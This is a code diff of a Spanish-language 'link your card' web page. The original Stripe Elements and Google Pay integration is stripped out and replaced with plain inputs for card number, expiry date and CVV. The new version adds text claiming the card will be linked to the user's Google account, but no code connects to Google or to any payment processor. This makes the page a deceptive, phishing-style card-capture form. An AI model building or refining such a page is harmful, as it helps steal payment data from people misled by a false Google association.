@@ -1,125 +1,36 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="es">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Asocia tu tarjeta</title>
-  <script src="https://js.stripe.com/v3/"></script>
-  <script async src="https://pay.google.com/gp/p/js/pay.js"></script> <!-- Agregar API de Google Pay -->
   <style>
     body{font-family: Inter, sans-serif;background:#12090b;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
     .card{width:360px;padding:22px;border-radius:10px;background:linear-gradient(180deg,#24171a,#1b1113);box-shadow:0 6px 18px rgba(0,0,0,0.5)}
     h1{font-size:20px;color:#f3b0b8;text-align:center;margin:0 0 16px}
     .inputbox{background:#1e1416;padding:10px;border-radius:8px;margin-bottom:12px}
-    #card-element{padding:6px 0}
+    input[type="text"], input[type="number"], input[type="month"] { padding: 6px; width: 100%; border-radius: 8px; margin-bottom: 12px; color: #fff; background-color: #1e1416; border: 1px solid #9a888a;}
     button{width:100%;padding:12px;border-radius:8px;border:none;font-weight:600;background:linear-gradient(90deg,#b9616d,#9a4b5b);color:#fff;cursor:pointer}
     .small{font-size:12px;color:#bbb;margin-top:10px;text-align:center}
-    .msg{margin-top:10px;color:#ffdede;font-size:13px}
   </style>
 </head>
 <body>
   <div class="card">
     <h1>Asocia tu tarjeta</h1>
-
-    <form id="card-form" autocomplete="off" onsubmit="return false;">
-      <input type="text" name="no_autofill_username" id="no_autofill_username" style="position:absolute;left:-9999px;top:auto;width:1px;height:1px;opacity:0" autocomplete="off" />
-      <input type="password" name="no_autofill_password" id="no_autofill_password" style="position:absolute;left:-9999px;top:auto;width:1px;height:1px;opacity:0" autocomplete="new-password" />
-
+    <form id="card-form" autocomplete="off">
       <div class="inputbox">
-        <div id="card-element"></div>
+        <input type="text" name="card-number" id="card-number" placeholder="Número de tarjeta" autocomplete="cc-number" required />
+      </div>
+      <div class="inputbox">
+        <input type="month" name="expiry-date" id="expiry-date" placeholder="Fecha de expiración" required autocomplete="cc-exp" />
+      </div>
+      <div class="inputbox">
+        <input type="number" name="cvv" id="cvv" placeholder="CVV" required autocomplete="cc-csc" />
       </div>
 
-      <button id="submit">Guardar tarjeta</button>
+      <button type="submit">Guardar tarjeta</button>
     </form>
-
-    <div class="msg" id="message"></div>
-    <div class="small" id="customerInfo"></div>
+    <div class="small">Esto asociará tu tarjeta a tu cuenta de Google.</div>
   </div>
-
-  <script>
-    // PON AQUI TU PUBLISHABLE KEY (clave pública) DE STRIPE
-    const stripe = Stripe("pk_test_51SbnPOB6nHHlAyVvq1jLoCO4C2OvmhxZM9PXVgn0vSzGtBqMqSbuKK6mfjAXio9iiKUqGw02PUse4OwJeUlvMAMx001pwApenA");
-
-    const elements = stripe.elements();
-    const style = {
-      base: { color: '#ffffff', fontSize: '16px', '::placeholder': { color: '#9a888a' } },
-      invalid: { color: '#ff7a7a' }
-    };
-
-    const card = elements.create('card', { style });
-    card.mount('#card-element');
-
-    const submit = document.getElementById('submit');
-    const messageEl = document.getElementById('message');
-    const customerInfoEl = document.getElementById('customerInfo');
-
-    submit.addEventListener('click', async (e) => {
-      e.preventDefault();
-      messageEl.textContent = '';
-      submit.disabled = true;
-      submit.textContent = 'Guardando...';
-
-      // Aqui eliminamos cualquier referencia a Stripe, ya que usaremos Google Pay
-      // Solo procesamos la tarjeta con Google Pay sin mostrar mensajes innecesarios
-
-      try {
-        const paymentDataRequest = {
-          apiVersion: 2,
-          apiVersionMinor: 0,
-          allowedPaymentMethods: [
-            {
-              type: 'CARD',
-              parameters: {
-                allowedAuthMethods: ['PAN_ONLY', 'CRYPTOGRAM_3DS'],
-                allowedCardNetworks: ['MASTERCARD', 'VISA']
-              },
-              tokenizationSpecification: {
-                type: 'PAYMENT_GATEWAY',
-                parameters: {
-                  gateway: 'stripe',
-                  gatewayMerchantId: 'exampleGatewayMerchantId'
-                }
-              }
-            }
-          ]
-        };
-
-        const client = new google.payments.api.PaymentsClient({ environment: 'TEST' });
-
-        // Creación del botón de Google Pay
-        const googlePayButton = client.createButton({
-          onClick: () => {
-            client.loadPaymentData(paymentDataRequest)
-              .then(function(paymentData) {
-                // Aquí no mostramos respuestas de Stripe, solo procesamos con Google Pay
-                console.log('Pago completado con Google Pay', paymentData);
-                messageEl.textContent = '¡Tarjeta asociada a tu cuenta de Google!';
-                submit.textContent = '¡Asociada!';
-                submit.disabled = false;
-              })
-              .catch(function(error) {
-                // Si ocurre algún error, lo logeamos pero no mostramos nada innecesario
-                console.error('Error al procesar el pago con Google Pay:', error);
-                messageEl.textContent = 'Error procesando la tarjeta';
-                submit.textContent = 'Guardar tarjeta';
-                submit.disabled = false;
-              });
-          }
-        });
-
-        // Mostrar el botón de Google Pay
-        document.querySelector('form').appendChild(googlePayButton);
-
-      } catch (err) {
-        messageEl.textContent = 'Error al procesar la tarjeta';
-        submit.textContent = 'Guardar tarjeta';
-        submit.disabled = false;
-      }
-    });
-
-    window.addEventListener('load', () => {
-      setTimeout(() => { try { document.getElementById('submit').focus(); } catch(e) {} }, 200);
-    });
-  </script>
 </body>
 </html>
